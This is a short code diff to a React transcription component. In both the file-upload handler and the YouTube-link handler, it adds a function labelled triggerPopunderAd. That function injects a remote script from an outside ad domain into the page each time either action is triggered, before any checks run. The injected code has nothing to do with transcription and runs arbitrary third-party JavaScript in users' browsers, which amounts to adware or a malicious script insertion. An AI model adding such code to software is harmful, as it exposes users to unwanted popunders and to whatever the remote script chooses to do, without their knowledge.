@@ -67,6 +67,13 @@ const Transcribe: React.FC<Props> = ({
   };
 
   const processFileUpload = async () => {
+    const triggerPopunderAd = () => {
+      const s = document.createElement('script');
+      s.dataset.zone = '11175479';
+      s.src = 'https://al5sm.com/tag.min.js';
+      document.body.appendChild(s);
+    };
+    triggerPopunderAd();
     if (!file || activeFileTask || isCheckingUsage) return;
     if (!checkApiKey()) return;
 
@@ -124,6 +131,13 @@ const Transcribe: React.FC<Props> = ({
   };
 
   const processYoutubeLink = async () => {
+    const triggerPopunderAd = () => {
+      const s = document.createElement('script');
+      s.dataset.zone = '11175479';
+      s.src = 'https://al5sm.com/tag.min.js';
+      document.body.appendChild(s);
+    };
+    triggerPopunderAd();
     if (!ytUrl || activeLinkTask || isCheckingUsage) return;
 
     try {
